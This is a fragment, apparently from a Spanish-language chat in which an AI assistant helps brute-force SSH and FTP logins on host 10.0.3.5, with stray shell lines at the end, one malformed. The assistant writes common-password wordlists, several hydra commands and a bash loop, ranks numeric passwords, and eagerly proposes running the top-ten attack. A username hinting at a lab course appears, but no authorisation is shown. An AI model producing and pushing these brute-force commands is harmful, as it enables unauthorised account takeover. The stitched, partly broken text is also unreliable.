cat > passwords_prohibidas.txt << 'EOF'
unouno
casa23
123456
password
qwerty
abc123
admin
root
12345
12345678
iloveyou
monkey
dragon
master
sunshine
football
letmein
welcome
whatever
654321
passw0rd
admin123
123123
000000
111111
222222
333333
555555
777777
888888
999999
asdfgh
zxcvbn
1qaz2wsx
qazwsx
123qwe
321qwe
123abc
987654321
1234567890
password123
EOF

# Ejecutar con todas
hydra -L usuarios.txt -P passwords_prohibidas.txt ssh://10.0.3.5 -t 5 -w 2.1 -v -o lo_prohibido.txt


¡Sí! `123456` es **la contraseña más común del mundo** según todas las filtraciones (RockYou, HaveIBeenPwned, etc.).

## Las contraseñas numéricas más comunes en orden:

```bash
cat > numeros_comunes.txt << 'EOF'
123456
12345678
123456789
12345
1234
123
1234567
987654321
987654
654321
111111
222222
333333
444444
555555
666666
777777
888888
999999
000000
112233
121212
131313
141414
151515
EOF
```

## Probar todos los usuarios con estos números:

```bash
hydra -L usuarios.txt -P numeros_comunes.txt ssh://10.0.3.5 -t 2 -w 3 -v -o resultado_numeros.txt
```

## Para probar específicamente "uno dos tres cuatro cinco seis" (123456):

```bash
# Probar solo 123456 con todos los usuarios
hydra -L usuarios.txt -p "123456" ssh://10.0.3.5 -t 2 -w 3 -v -o resultado_123456.txt
```

## Lo más común en español ("uno dos tres cuatro" = 1234):

```bash
# Probar las secuencias numéricas típicas
for num in 1234 12345 123456 12345678 123456789; do
    echo "=== Probando: $num ==="
    hydra -L usuarios.txt -p "$num" ssh://10.0.3.5 -t 2 -w 3 -v -o "resultado_${num}.txt"
done
```

## Ranking de contraseñas numéricas (por frecuencia):

| Ranking | Contraseña | Frecuencia |
|---------|-----------|------------|
| 1 | 123456 | Más común |
| 2 | 12345678 | 2º más común |
| 3 | 123456789 | 3º más común |
| 4 | 12345 | 4º más común |
| 5 | 1234 | 5º más común |
| 6 | 123 | 6º más común |
| 7 | 111111 | 7º más común |
| 8 | 1234567 | 8º más común |
| 9 | 000000 | 9º más común |
| 10 | 777777 | 10º más común |

## El comando más efectivo (probar los top 10 números):

```bash
cat > top10_numeros.txt << 'EOF'
123456
12345678
123456789
12345
1234
123
111111
1234567
000000
777777
EOF

hydra -L usuarios.txt -P top10_numeros.txt ssh://10.0.3.5 -t 2 -w 3 -v -o resultado_top10_numeros.txt
```

**¿Ejecutamos el top 10 números?** Es rápido y tiene alta probabilidad de éxito.



fsi03@attacker-3:~/archivos/ataques_triviales$ hydra -L usuarios.txt -P combos_usuario_comunes.txt ://10.0.3.5 -t 5 -w 2.1 -v -o lo_prohibido.txt




hydra -L usuarios.txt -p 123 ftp://10.0.3.5 -t 5 -w 2.1 -v -o lo_prohibido.txt



